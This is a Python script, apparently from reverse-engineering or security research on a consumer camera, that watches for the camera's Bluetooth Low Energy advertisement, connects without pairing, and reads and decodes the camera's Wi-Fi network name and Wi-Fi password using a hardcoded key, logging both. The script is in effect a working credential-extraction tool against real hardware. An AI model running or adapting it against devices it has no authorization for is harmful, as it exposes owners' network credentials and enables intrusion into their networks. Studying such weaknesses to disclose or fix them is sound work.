#!/usr/bin/env python3
"""
Watch for the camera's BLE advertiser; when it appears:
  1) connect (no pairing)
  2) full GATT enumeration
  3) 25 s idle-stability test
  4) read INITIAL_INFORM (idx35) -> SSID (idx5) -> WIFI PASS (idx6)
Everything is logged. Read-only: no writes, no CCCD subscription.

Usage: python s5_ble_watch.py [minutes]
"""
import asyncio
import datetime
import os
import sys

from bleak import BleakClient, BleakScanner

import s5_ble as S5

LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "s5_ble_watch.log")


def log(msg):
    line = f"[{datetime.datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass


async def find_camera(scan_secs=8.0):
    devs = await BleakScanner.discover(timeout=scan_secs, return_adv=True)
    for addr, (d, adv) in devs.items():
        mfg = (adv.manufacturer_data or {}).get(0x003A) or b""
        if S5.is_camera(adv.local_name, mfg, [u.lower() for u in (adv.service_uuids or [])]):
            log(f"[HIT] {addr} name={adv.local_name!r} rssi={adv.rssi} svc={adv.service_uuids} mfg={ {hex(k): bytes(v).hex() for k, v in (adv.manufacturer_data or {}).items()} }")
            return addr
    return None


async def run_session(addr):
    log(f"[*] connecting to {addr} (no pairing) ...")
    async with BleakClient(addr, timeout=30.0) as client:
        log(f"[+] connected={client.is_connected}")
        await S5.enumerate_gatt(client)
        if not await S5.idle_test(client, 25.0):
            return
        d35 = await S5.try_read(client, S5.IDX35, "INITIAL_INFORM (idx35)")
        if not client.is_connected:
            log("[!] LINK DROPPED at idx35 -> camera enforces encrypted/authenticated link (replicates macOS finding)")
            return
        if d35:
            key = int.from_bytes(d35[:4], "big") or 0x9032782C
            log(f"[*] session key = 0x{key:08X}")
        d5 = await S5.try_read(client, S5.IDX5, "CAMERA_SSID (idx5)")
        if not client.is_connected:
            log("[!] LINK DROPPED at idx5")
            return
        if d5:
            log(f"[*] SSID decoded (key 0x9032782C) = {S5.decode_cam(d5, 0x9032782C)!r}")
        d6 = await S5.try_read(client, S5.IDX6, "WIFI_PASSWORD (idx6)")
        if not client.is_connected:
            log("[!] LINK DROPPED at idx6")
            return
        if d6:
            log(f"[*] PASS decoded (key 0x9032782C) = {S5.decode_cam(d6, 0x9032782C)!r}")


async def main(minutes=60.0):
    import time
    log(f"=== BLE watcher start (up to {minutes} min) ===")
    deadline = time.time() + minutes * 60
    while time.time() < deadline:
        try:
            addr = await find_camera(8.0)
        except Exception as e:
            log(f"[!] scan error: {type(e).__name__}: {e}")
            await asyncio.sleep(10)
            continue
        if addr:
            try:
                await run_session(addr)
            except Exception as e:
                log(f"[!] session error: {type(e).__name__}: {e}")
            log("=== session finished; continuing to watch ===")
        await asyncio.sleep(15)
    log("=== BLE watcher timeout ===")


if __name__ == "__main__":
    mins = float(sys.argv[1]) if len(sys.argv) > 1 else 60.0
    asyncio.run(main(mins))
